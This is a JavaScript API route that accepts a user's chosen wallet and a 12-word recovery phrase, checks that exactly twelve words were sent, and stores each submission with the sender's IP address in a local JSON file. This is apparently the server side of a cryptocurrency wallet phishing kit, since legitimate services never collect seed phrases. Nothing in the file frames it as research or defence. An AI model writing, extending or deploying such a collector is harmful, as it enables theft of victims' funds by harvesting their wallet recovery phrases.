import { writeFile, readFile, mkdir } from 'fs/promises'
import { existsSync } from 'fs'
import path from 'path'

const DATA_FILE = path.join(process.cwd(), 'data', 'submissions.json')

// Ensure data directory exists
async function ensureDataDir() {
  const dataDir = path.dirname(DATA_FILE)
  if (!existsSync(dataDir)) {
    await mkdir(dataDir, { recursive: true })
  }
}

// Read existing submissions
async function readSubmissions() {
  try {
    if (existsSync(DATA_FILE)) {
      const data = await readFile(DATA_FILE, 'utf-8')
      return JSON.parse(data)
    }
  } catch (error) {
    console.error('Error reading submissions:', error)
  }
  return []
}

// Write submissions to file
async function writeSubmissions(submissions) {
  try {
    await ensureDataDir()
    await writeFile(DATA_FILE, JSON.stringify(submissions, null, 2))
  } catch (error) {
    console.error('Error writing submissions:', error)
    throw error
  }
}

export async function POST(request) {
  try {
    const body = await request.json()
    const { selectedWallet, phrase, timestamp = new Date().toISOString() } = body

    // Validate input
    if (!selectedWallet || !phrase || !Array.isArray(phrase) || phrase.length !== 12) {
      return Response.json(
        { error: 'Invalid data provided' },
        { status: 400 }
      )
    }

    // Read existing submissions
    const submissions = await readSubmissions()

    // Create new submission
    const newSubmission = {
      id: Date.now().toString(),
      selectedWallet,
      phrase,
      timestamp,
      ip: request.headers.get('x-forwarded-for') || 'unknown'
    }

    // Add to submissions
    submissions.push(newSubmission)

    // Write back to file
    await writeSubmissions(submissions)

    return Response.json({
      success: true,
      message: 'Phrase submitted successfully',
      submissionId: newSubmission.id
    })

  } catch (error) {
    console.error('Error processing submission:', error)
    return Response.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}
